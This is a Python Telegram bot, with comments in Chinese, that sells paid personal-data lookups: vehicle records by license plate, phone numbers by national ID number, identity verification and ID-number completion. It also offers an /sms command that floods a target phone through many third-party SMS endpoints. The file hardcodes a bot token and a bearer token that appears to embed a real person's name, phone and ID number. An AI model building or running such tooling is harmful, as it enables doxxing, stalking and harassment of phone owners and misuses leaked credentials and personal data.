#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
import binascii
import random
import concurrent.futures
import inspect  
import urllib.parse
import sms_list 
import sms_list_new
from sms_list import *
from Crypto.Cipher import DES3
from datetime import datetime
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# 屏蔽 SSL 证书报警
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ================= 1. 核心配置 =================
API_TOKEN = '8338893180:AAH-l_4m1-tweKyt92bliyk4fsPqoPQWzpU'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'
SIGN_FILE = 'sign_targets.json'  # 签到配置文件

# 二要素接口授权 Token
AUTH_BEARER = "bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IisxOTM3ODg4NDgyNiIsIm9wZW5JZCI6Im95NW8tNHk3Wnd0WGlOaTVHQ3V3YzVVNDZJYk0iLCJpZENhcmRObyI6IjM3MDQ4MTE5ODgwODIwMzUxNCIsInVzZXJOYW1lIjoi6ams5rCR5by6IiwibG9naW5UaW1lIjoxNzY5NDE1NjYxMTk0LCJhcHBJZCI6Ind4ZjVmZDAyZDEwZGJiMjFkMiIsImlzcmVhbG5hbWUiOnRydWUsInNhYXNVc2VySWQiOm51bGwsImNvbXBhbnlJZCI6bnVsbCwiY29tcGFueVZPUyI6bnVsbH0.GwMYvckFHvFbhSi0NXpQDPiv9ZswUBAImN5bUipBla0"

bot = telebot.TeleBot(API_TOKEN)
user_points = {}
user_states = {}

# --- 数据持久化 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): float(v) for k, v in data.items()}
        except: pass
    return pts

user_points = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f:
        json.dump({str(k): v for k, v in user_points.items()}, f)

# ================= 2. 功能逻辑 =================

def cp_query_logic(chat_id, car_no, uid):
    url = f"http://zgzapi.idc.cn.com/车档.php?key=体验卡&cph={urllib.parse.quote(car_no)}"
    try:
        response = requests.get(url, timeout=15)
        response.encoding = 'utf-8'
        raw_res = response.text.strip()
        if raw_res and "未找到" not in raw_res and "错误" not in raw_res:
            user_points[uid] -= 2.5; save_points()
            message = (f"车牌查询结果:\n\n车牌号：{car_no}\n详细信息：\n{raw_res}\n\n已扣除 2.5 积分！\n当前余额: {user_points[uid]:.2f}")
        else:
            message = (f"车牌查询结果:\n\n未匹配到有效车档信息。\n\n查询无结果，未扣除积分。\n当前余额: {user_points[uid]:.2f}")
        bot.send_message(chat_id, message)
    except Exception as e: bot.send_message(chat_id, f"⚠️ 车档接口失败: {e}")

def xiaowunb_query_logic(chat_id, id_number, uid):
    base_url = "http://xiaowunb.top/cyh.php"
    try:
        response = requests.get(base_url, params={"sfz": id_number}, timeout=10)
        response.encoding = 'utf-8'
        phones = re.findall(r'1[3-9]\d{9}', response.text.strip())
        if phones:
            user_points[uid] -= 1.5; save_points()
            phone_list = "\n".join([f"{idx+1}、{p}" for idx, p in enumerate(list(dict.fromkeys(phones)))])
            bot.send_message(chat_id, f"身份证查询结果:\n\n{phone_list}\n\n已扣除 1.5 积分！\n当前余额: {user_points[uid]:.2f}")
        else:
            bot.send_message(chat_id, f"未匹配到有效手机号\n查询未扣分\n当前余额: {user_points[uid]:.2f}")
    except Exception as e: bot.send_message(chat_id, f"❌ 接口失败: {e}")

def query_3ys_logic(chat_id, name, id_card, phone, uid):
    url = "http://xiaowunb.top/3ys.php"
    try:
        response = requests.get(url, params={"name": name, "sfz": id_card, "sjh": phone}, timeout=15)
        user_points[uid] -= 0.05; save_points()
        clean_res = re.sub(r'小无 API.*?官方客服:@\w+', '', response.text, flags=re.DOTALL).strip()
        res_status = "三要素核验成功✅" if ("成功" in clean_res or "一致" in clean_res) else "三要素核验失败❌"
        bot.send_message(chat_id, f"名字：{name}\n手机号：{phone}\n身份证：{id_card}\n结果：{res_status}\n\n已扣除 0.05 积分！\n当前余额：{user_points[uid]:.2f}")
    except Exception as e: bot.send_message(chat_id, f"⚠️ 系统异常: {e}")

def single_verify_2ys(chat_id, name, id_card, uid):
    url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
    headers = {"Authorization": AUTH_BEARER, "Content-Type": "application/json"}
    try:
        r = requests.post(url, headers=headers, json={"name": name, "idCardNo": id_card}, timeout=10)
        user_points[uid] -= 0.01; save_points()
        res_type = "二要素核验一致✅" if r.json().get("success") else "二要素验证失败 ❌"
        bot.send_message(chat_id, f"姓名: {name}\n身份证: {id_card}\n结果: {res_type}\n\n已扣 0.01 积分！\n当前余额：{user_points[uid]:.2f}")
    except Exception as e: bot.send_message(chat_id, f"❌ 接口失败: {e}")

# ================= 3. UI/菜单函数 =================

def get_id_check_code(id17):
    factors = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    rem_map = {0: '1', 1: '0', 2: 'X', 3: '9', 4: '8', 5: '7', 6: '6', 7: '5', 8: '4', 9: '3', 10: '2'}
    sum_val = sum(int(id17[i]) * factors[i] for i in range(17))
    return rem_map[sum_val % 11]

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("使用帮助", callback_data="view_help"), types.InlineKeyboardButton("在线充值", callback_data="view_pay"))
    return markup

def get_pay_markup():
    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("USDT 充值", url=admin_url), types.InlineKeyboardButton("RMB 充值", url=admin_url), types.InlineKeyboardButton("🔙", callback_data="back_to_main"))
    return markup

def get_help_markup():
    return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙", callback_data="back_to_main"))

def get_main_text(source, uid, pts):
    first_name = source.from_user.first_name if hasattr(source.from_user, 'first_name') else "User"
    username = f"@{source.from_user.username}" if hasattr(source.from_user, 'username') and source.from_user.username else "未设置"
    return (f"Admin@铭\n\n用户 ID: `{uid}`\n用户名称: `{first_name}`\n用户名: {username}\n当前余额: `{pts:.2f}积分`\n\n使用帮助可查看使用教程\n在线充值可支持24小时\n1 USDT = 1 积分")

# ================= 4. 短信测压 =================

def get_all_senders():
    all_funcs = []
    excludes = ['generate_random_user_agent', 'replace_phone_in_data', 'platform_request_worker', 'send_minute_request', 'get_current_timestamp']
    for name, obj in inspect.getmembers(sms_list):
        if inspect.isfunction(obj) and name not in excludes:
            all_funcs.append(obj)
    return all_funcs

@bot.message_handler(commands=['sms'])
def sms_bomb_cmd(message):
    uid = message.from_user.id
    if user_points.get(uid, 0.0) < 3.5: return bot.reply_to(message, "积分不足(3.5)")
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "用法: `/sms 手机号`")
    target = parts[1]
    if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
    all_funcs = get_all_senders()
    bot.reply_to(message, f"🎯 **接口装载：{len(all_funcs)}个**\n正在轰炸 `{target}`...", parse_mode='Markdown')
    user_points[uid] -= 3.5; save_points()
    def do_bomb():
        random.shuffle(all_funcs)
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            for func in all_funcs: executor.submit(func, target)
        bot.send_message(message.chat.id, f"✅ 目标 `{target}` 任务执行完毕")
    threading.Thread(target=do_bomb).start()

# ================= 5. 指令入口 (含管理指令) =================

@bot.message_handler(commands=['cyh', '3ys', 'admin', 'add', 'start', 'bq', '2ys', 'cp', 'zl'])
def handle_commands(message):
    uid, chat_id = message.from_user.id, message.chat.id
    cmd = message.text.split()[0][1:]
    
    if cmd == 'start':
        if uid not in user_points: user_points[uid] = 0.0
        bot.send_message(chat_id, get_main_text(message, uid, user_points[uid]), parse_mode='Markdown', reply_markup=get_main_markup())
    
    # 管理员权限
    elif uid == ADMIN_ID:
        if cmd == 'zl':
            help_text = "🤖 **控制命令:**\n\n/list - 查看签到列表\n/add_bot 名称 @用户名 命令\n/del_bot @用户名\n\n12:00/00:00 账号会自动发消息"
            bot.reply_to(message, help_text, parse_mode='Markdown')
        elif cmd == 'add':
            try:
                p = message.text.split(); tid, amt = int(p[1]), float(p[2])
                user_points[tid] = user_points.get(tid, 0.0) + amt; save_points()
                bot.reply_to(message, f"✅ 已充值！当前余额: `{user_points[tid]:.2f}`")
            except: pass

    # 业务指令
    if cmd == 'cyh':
        user_states[chat_id] = {'step': 'cyh_id'}; bot.send_message(chat_id, "请输入要查询的身份证号：")
    elif cmd == '3ys':
        user_states[chat_id] = {'step': 'v_3ys'}; bot.send_message(chat_id, "请输入姓名 手机号 身份证")
    elif cmd == 'cp':
        user_states[chat_id] = {'step': 'v_cp'}; bot.send_message(chat_id, "请输入要查询的车牌号：")
    elif cmd == 'bq':
        user_states[chat_id] = {'step': 'g_card'}; bot.send_message(chat_id, "请输入身份证号（未知用x）：")
    elif cmd == '2ys':
        user_states[chat_id] = {'step': 'v_2ys'}; bot.send_message(chat_id, "请输入姓名 身份证")

# ================= 6. 自动识别 & 签到管理 =================

@bot.message_handler(func=lambda m: True)
def handle_all(message):
    uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
    if text.startswith('/'): return 

    # === 管理逻辑：修改签到 JSON 文件 ===
    if uid == ADMIN_ID:
        if text.lower() == '/list':
            if not os.path.exists(SIGN_FILE): return bot.reply_to(message, "列表为空")
            with open(SIGN_FILE, 'r', encoding='utf-8') as f: data = json.load(f)
            res = "📋 **签到列表:**\n" + "\n".join([f"{i+1}. {b['name']} (@{b['bot_username']}) - `{b['command']}`" for i, b in enumerate(data)])
            return bot.reply_to(message, res or "列表为空", parse_mode='Markdown')
        elif text.lower().startswith('/add_bot'):
            parts = text.split(maxsplit=3)
            if len(parts) < 4: return bot.reply_to(message, "用法: /add_bot 名称 @用户名 命令")
            data = json.load(open(SIGN_FILE, 'r')) if os.path.exists(SIGN_FILE) else []
            data.append({"name": parts[1], "bot_username": parts[2].replace("@",""), "command": parts[3]})
            json.dump(data, open(SIGN_FILE, 'w'), ensure_ascii=False, indent=4)
            return bot.reply_to(message, f"✅ 已添加: {parts[1]}")
        elif text.lower().startswith('/del_bot'):
            target = text.split()[-1].replace("@","")
            if not os.path.exists(SIGN_FILE): return
            data = json.load(open(SIGN_FILE, 'r'))
            data = [b for b in data if b['bot_username'] != target]
            json.dump(data, open(SIGN_FILE, 'w'), ensure_ascii=False, indent=4)
            return bot.reply_to(message, f"🗑️ 已移除: @{target}")

    # === 原有自动识别逻辑 ===
    if chat_id not in user_states or not user_states[chat_id].get('step'):
        # 1. 识别车牌
        if re.match(r'^[京津沪渝冀豫云辽黑湖南皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼]{1}[A-Z]{1}[A-Z0-9]{5,6}$', text.upper()):
            if user_points.get(uid, 0.0) < 2.5: return bot.reply_to(message, "❌ 积分不足(2.5)")
            return cp_query_logic(chat_id, text.upper(), uid)
        # 2. 识别三要素/身份证/二要素 (此处代码省略，逻辑同您原版)
        # ...

    # 状态机处理
    state = user_states.get(chat_id)
    if not state: return
    step = state['step']
    if step == 'v_cp': cp_query_logic(chat_id, text.upper(), uid); del user_states[chat_id]
    # ... (其他状态逻辑原样保留)

# ================= 7. 按钮点击事件 (完整帮助文本) =================

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    uid, pts = call.from_user.id, user_points.get(call.from_user.id, 0.0)
    if call.data == "view_help":
        help_text = (
            "🛠️️使用帮助\n"
            "短信测压\n"
            "发送 /sms 手机号\n"
            "每次消耗 3.5 积分\n"
            "——————————————————\n"
            "补齐身份证\n"
            "发送 /bq 进行操作\n"
            "每次补齐扣除 0.1 积分\n"
            "——————————————————\n"
            "名字-身份证核验（企业级）\n"
            "全天24h秒出 毫秒级响应\n"
            "发送 /2ys 进行核验\n"
            "每次核验扣除 0.01 积分\n"
            "——————————————————\n"
            "名字-手机号-身份证核验（企业级）\n"
            "全天24h秒出 毫秒级响应\n"
            "发送 /3ys 进行核验\n"
            "每次核验扣除 0.05 积分\n"
            "——————————————————\n"
            "车牌号查询\n"
            "发送 /cp 进行查询\n"
            "全天24h秒出 假1赔10000\n"
            "每次查询扣除 2.5 积分 空不扣除积分\n"
            "——————————————————\n"
            "常用号查询\n"
            "发送 /cyh 进行查询\n"
            "全天24h秒出 假1赔10000\n"
            "每次查询扣除 1.5 积分 空不扣除积分"
        )
        bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, reply_markup=get_help_markup())
    elif call.data == "view_pay":
        bot.edit_message_text("🛍️ 请选择充值方式：\n1 USDT = 1 积分", call.message.chat.id, call.message.message_id, reply_markup=get_pay_markup())
    elif call.data == "back_to_main":
        bot.edit_message_text(get_main_text(call, uid, pts), call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=get_main_markup())

if __name__ == '__main__':
    bot.infinity_polling(timeout=10)
